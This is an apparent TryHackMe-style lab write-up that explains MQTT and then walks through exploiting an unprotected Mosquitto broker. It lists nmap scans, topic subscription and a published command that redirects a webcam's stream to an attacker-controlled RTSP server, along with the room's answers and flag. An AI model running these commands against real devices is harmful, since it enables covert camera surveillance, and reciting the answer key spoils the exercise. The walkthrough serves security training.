
IoT:

The Internet of Things refers to physical devices that send and receive data to communicate with other devices or cloud services. These devices often operate autonomously and rely heavily on network communication to perform their intended functions.

Examples include smart cameras, thermostats, door locks, and industrial sensors.

While IoT devices increase convenience and automation, poor security practices can turn them into serious attack surfaces.

---

IoT Protocols Explained

IoT protocols are designed for efficient and lightweight communication. They fall into two main categories.

IoT Data Protocols  
These operate over TCP or UDP and include protocols such as HTTP, MQTT, SMB, and FTP.

IoT Network Protocols  
These handle wireless connectivity and include Wi-Fi, Bluetooth, ZigBee, and Z-Wave.

MQTT is a popular IoT data protocol due to its low overhead and publish subscribe architecture.

---

MQTT and the Publish Subscribe Model

MQTT operates using a broker that manages communication between publishers and subscribers.

• Publishers send messages to topics  
• Subscribers receive messages from topics  
• Topics act as message channels  
• The broker routes messages accordingly

If topics are not properly protected, attackers can enumerate them, subscribe to sensitive data, and publish malicious commands.

---

```text
Exploitation:

Question 1  
What port is Mosquitto running on?

Using a full port scan:

nmap -p- <target> -vv --min-rate 1500

Answer:  
1883

---

Question 2  
Is the device/init topic enumerated by Nmap during a script scan?

Command used:

nmap -sC -sV -p- <target> -vv --min-rate 1500

Answer:  
y

---

Question 3  
What Mosquitto version is the device using?

Answer:  
1.6.9

---

Question 4  
What flag is obtained from viewing the RTSP stream?

Subscribe to the initialization topic to retrieve the device ID:

mosquitto_sub -t device/init -h <target>

Start an RTSP server:

docker run --rm -it --network=host aler9/rtsp-simple-server

Publish a command directing the webcam to stream to the RTSP server:

mosquitto_pub -h <target> -t device/<ID>/cmd -m """{"cmd":"10","url":"rtsp://<attacker_ip>:8554/bingo"}"""

View the stream using VLC:

vlc rtsp://127.0.0.1:8554/bingo

Flag obtained:

THM{UR_CAMERA_IS_MINE}

```
